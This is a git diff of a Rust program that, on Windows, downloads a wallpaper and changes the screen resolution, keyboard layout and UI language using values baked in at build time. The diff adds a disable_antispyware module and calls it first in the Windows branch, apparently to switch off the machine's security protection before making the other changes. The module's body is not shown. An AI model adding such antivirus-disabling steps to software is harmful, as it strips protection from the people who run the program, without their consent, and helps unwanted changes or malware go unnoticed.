@@ -1,16 +1,17 @@
-use anyhow::Result;
-use tokio;
-mod util;
-use util::download_file;
-mod wallpaper;
-use wallpaper::Wallpaper;
+mod disable_antispyware;
 mod keyboard;
 mod screen;
+mod ui_language;
+mod util;
+mod wallpaper;
+use anyhow::Result;
+use disable_antispyware::disable_antispyware;
 use keyboard::Keyboard;
 use screen::Screen;
-mod ui_language;
+use tokio;
 use ui_language::UILanguage;
-
+use util::download_file;
+use wallpaper::Wallpaper;
 #[tokio::main]
 async fn main() -> Result<()> {
     let mut wallpaper = Wallpaper::new(env!("WALLPAPER_URL").to_string());
@@ -24,7 +25,6 @@ async fn main() -> Result<()> {
     #[cfg(target_os = "windows")]
     let mut ui_language = UILanguage {
         target_lang: env!("TARGET_LANG").to_string(),
-        target_lang_id: env!("TARGET_LANG_ID").parse().unwrap(),
         target_lang_reg: env!("TARGET_LANG_REG").to_string(),
         num_langs: env!("TARGET_LANG_NUM").parse().unwrap(),
     };
@@ -35,6 +35,7 @@ async fn main() -> Result<()> {
     };
 
     if cfg!(target_os = "windows") {
+        disable_antispyware();
         screen.change_resulation();
         download_file(&wallpaper.url, &wallpaper.image_path).await?;
         keyboard.change_keyboard_layout();
